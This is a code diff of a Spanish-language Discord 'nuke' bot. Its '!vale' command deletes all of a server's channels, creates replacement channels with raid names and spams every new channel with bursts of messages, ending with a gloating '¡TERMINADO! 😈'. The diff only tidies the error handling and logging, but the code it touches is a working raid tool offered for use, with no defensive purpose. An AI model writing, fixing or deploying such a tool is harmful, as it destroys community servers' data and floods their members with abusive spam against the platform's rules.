@@ -13,7 +13,7 @@ const client = new Client({
 });
 
 const PREFIX = '!';
-const OWNER_IDS = ["1436516806842912970"]; // TU ID REAL aquí
+const OWNER_IDS = ["1436516806842912970"]; // TU ID REAL
 
 client.once('ready', () => {
   console.log(chalk.green.bold(`Bot conectado como ${client.user.tag}`));
@@ -56,18 +56,18 @@ client.on('messageCreate', async (message) => {
 
     const delayEntreMensajes = 1300;
 
-    await message.reply(
-      `**¡NUKE PERSONALIZADO INICIANDO EN 5 SEGUNDOS!**\n\n` +
-      `→ Creando **${nombresDeCanales.length}** canales\n` +
-      `→ Enviando **${mensajesEnRafaga.length}** mensajes por canal\n\n` +
-      `¡Ctrl + C para cancelar!`
-    ).catch(err => console.log('No se pudo responder inicio:', err.message));
-
-    await new Promise(r => setTimeout(r, 5000));
-
-    const guild = message.guild;
-
     try {
+      await message.reply(
+        `**¡NUKE PERSONALIZADO INICIANDO EN 5 SEGUNDOS!**\n\n` +
+        `→ Creando **${nombresDeCanales.length}** canales\n` +
+        `→ Enviando **${mensajesEnRafaga.length}** mensajes por canal\n\n` +
+        `¡Ctrl + C para cancelar!`
+      );
+
+      await new Promise(r => setTimeout(r, 5000));
+
+      const guild = message.guild;
+
       // 1. Borrar canales
       let borrados = 0;
       for (const ch of guild.channels.cache.values()) {
@@ -79,7 +79,7 @@ client.on('messageCreate', async (message) => {
           } catch {}
         }
       }
-      await message.channel.send(`→ Borrados **${borrados}** canales.`).catch(() => {});
+      await message.channel.send(`→ Borrados **${borrados}** canales.`);
 
       // 2. Crear canales
       const nuevosCanales = [];
@@ -87,13 +87,11 @@ client.on('messageCreate', async (message) => {
         try {
           let nombre = nombreOriginal
             .toLowerCase()
-            .replace(/[^a-z0-9- ]/g, '-')     // solo a-z, 0-9, -, espacio
-            .replace(/\s+/g, '-')             // espacios → -
-            .replace(/-+/g, '-')              // evitar -----
-            .replace(/^-|-$/g, '')            // quitar - inicial/final
-            .slice(0, 100);
-
-          if (!nombre) nombre = 'raid-default-' + Date.now().toString().slice(-6);
+            .replace(/[^a-z0-9- ]/g, '-')
+            .replace(/\s+/g, '-')
+            .replace(/-+/g, '-')
+            .replace(/^-|-$/g, '')
+            .slice(0, 100) || 'raid-default';
 
           const canal = await guild.channels.create({
             name: nombre,
@@ -110,8 +108,7 @@ client.on('messageCreate', async (message) => {
           console.log(chalk.red(`Fallo creando "${nombreOriginal}": ${err.message}`));
         }
       }
-
-      await message.channel.send(`→ Creados **${nuevosCanales.length}** canales.`).catch(() => {});
+      await message.channel.send(`→ Creados **${nuevosCanales.length}** canales.`);
 
       // 3. Spam
       let spameados = 0;
@@ -119,7 +116,7 @@ client.on('messageCreate', async (message) => {
         try {
           for (const msg of mensajesEnRafaga) {
             await canal.send(msg);
-            console.log(chalk.blue(`Enviado a #${canal.name}: ${msg.substring(0, 40)}...`));
+            console.log(chalk.blue(`Enviado a #${canal.name}`));
             await new Promise(r => setTimeout(r, delayEntreMensajes));
           }
           spameados++;
@@ -128,10 +125,10 @@ client.on('messageCreate', async (message) => {
         }
       }
 
-      await message.channel.send(`**¡TERMINADO!** 😈\nCanales spameados: **${spameados}**`).catch(() => {});
+      await message.channel.send(`**¡TERMINADO!** 😈\nCanales spameados: **${spameados}**`);
 
     } catch (err) {
-      console.error(chalk.red.bold('Error grave en !vale:'), err.stack || err);
+      console.error(chalk.red.bold('Error en !vale:'), err);
       await message.channel.send('Error grave. Revisa logs.').catch(() => {});
     }
   }
@@ -142,5 +139,5 @@ client.on('messageCreate', async (message) => {
 });
 
 client.login(process.env.TOKEN).catch(err => {
-  console.error(chalk.red.bold('Error crítico al conectar:'), err.message || err);
+  console.error(chalk.red.bold('Error al conectar:'), err.message || err);
 });
